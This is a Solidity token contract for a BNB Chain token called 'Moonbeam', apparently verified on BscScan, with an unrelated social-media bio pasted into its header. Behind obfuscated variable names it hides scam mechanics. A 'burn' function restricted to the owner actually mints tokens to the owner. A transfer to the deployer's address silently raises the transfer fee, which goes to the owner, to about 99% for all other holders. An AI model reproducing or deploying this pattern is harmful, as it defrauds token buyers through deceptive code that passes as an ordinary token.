/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

////////////////////////////////////////////
//Moonbeam 
//🌸 Bloom!🐴🦄
//@BloomMoonbeam
//hiya, i’m bloom! 🌷 | i post about ponies… a lot | toy/mh collector | applejack fanatic | reigen enthusiast | csm brainrot | art:@BloomHorse
//https://www.redbubble.com
//https://www.facebook.com/Redbubble
//https://twitter.com/BloomMoonbeam 
////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity =0.8.14;
contract Moonbeam {
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  name = "Moonbeam";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  IDRdcC = address(0);
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  Gtpnwm = address(0);
uint256 public  vyvHbB = 100000000000000000000000;
string public  symbol = "Moonbeam";
uint256 public  FwxSwD = 10000000000000000000000000000;
address public  Aqjkwf = address(0);
uint256 public  leWURJ = 1000000000000000000;
uint256 private  dZXVPi = 10000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public  wcYRUA = address(0);
uint256 public  KMyzHX = 100000000000000000000;
address public  eNzrHG = address(0);
uint256 public  prpFIZ = 10000000000000000;
address public  yEIUzA = address(0);
uint256 public  zLnSFN = 100000000000000000;
uint256 public  JIFxpl = 100000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant fhONJB = 999;
address public  XwKcsU = address(0);
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
uint256 public  FyOOgv = 10000000000000000000;
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "XqfpRN");
require(to != address(0), "XqfpRN");
require(amount <= balanceOf[from], "XqfpRN");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* fhONJB/dZXVPi ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==IDRdcC){
dZXVPi = 999+9;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor ()  {
IDRdcC = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}